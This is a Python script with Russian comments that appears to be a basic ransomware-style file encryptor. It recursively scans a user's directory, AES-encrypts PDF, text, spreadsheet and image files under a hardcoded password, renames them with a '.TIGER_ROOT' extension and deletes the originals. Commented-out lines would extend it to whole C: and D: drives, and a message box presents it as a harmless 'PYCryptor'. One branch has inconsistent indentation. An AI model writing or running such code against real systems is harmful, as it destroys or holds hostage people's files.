#Импортируем необходимые библиотеки
import os

import pyAesCrypt
import tkinter as tk
from tkinter import messagebox as mb

#Делаем Месседж-Бокс с подсказкой , как использовать даный код
root = tk.Tk()
root.overrideredirect(1)
root.withdraw()
mb.showinfo("It is a PYCryptor", "Reopen this program to encrypt/decrypt your files!")

#Пароль и bufferSize для криптора , можете указать свои
password = 'tigerk'
bufferSize = 512 * 2048


	
# "Двигатель" самого криптора
def search_and_crypt_file(file):
	filename, file_extension = os.path.splitext(str(file))						   #Распознавание файла и его разширения с помощью метода splitext
	
	if	file_extension == ".pdf":												   # Криптор для файлов с разширением  ".pdf"
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)	 #Файл str(file) шифруется и добавляет разширение '.TIGER_ROOT' , используя ранее установленый пароль и bufferSize
		os.remove(file)																		#Файлы из старым разширением убираются , это используется и в декрипторе
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '') , password , bufferSize)
		os.remove(file)
	
	if	file_extension == ".txt":
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)
		os.remove(file)
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '')  , password , bufferSize)
		os.remove(file)	
	
	if	file_extension == ".xls":
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)
		os.remove(file)
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '')  , password , bufferSize)
		os.remove(file)
	
	if	file_extension == ".xlsx":
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)
		os.remove(file)
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '')  , password , bufferSize)
		os.remove(file)	
	
	if	file_extension == ".jpg":
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)
		os.remove(file)
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '') , password , bufferSize)
		os.remove(file)
	
    if	file_extension == ".png":
		pyAesCrypt.encryptFile(str(file), str(file) + '.TIGER_ROOT', password, bufferSize)
		os.remove(file)
	elif file_extension == ".TIGER_ROOT":
		pyAesCrypt.decryptFile(str(file) , str(file).replace('.TIGER_ROOT' , '') , password , bufferSize)
		os.remove(file)
	
# Поиск файла
def search_dir(dir):
	for name in os.listdir(dir):	
		try:
		
			path = os.path.join(dir, name)
			if os.path.isfile(path) == True :				   #Если файл в директории существует
				search_and_crypt_file(path)					   #Запускаем функцию search_and_crypt_file , которая зашифрует , или розшифрует файл
					
			else:											   #Иначе продолжаем дальше искать
				search_dir(path)									
		except:												   #try-except для перехвата ошибок , чтобы наш цикл не упал
			continue
			
#search_dir(r"D:\\")                                            # Можете указать эти 2 директории , тогда будут шифроваться все файлы(с определенными разширениями) 
#search_dir(r"C:\\")                                            # в этих директориях и папках , дочерних к ним

search_dir(os.environ['HOMEDRIVE'] + os.environ['HOMEPATH'] + '\\Downloads\\new\\') #Директория , в которой будут поиски файлов
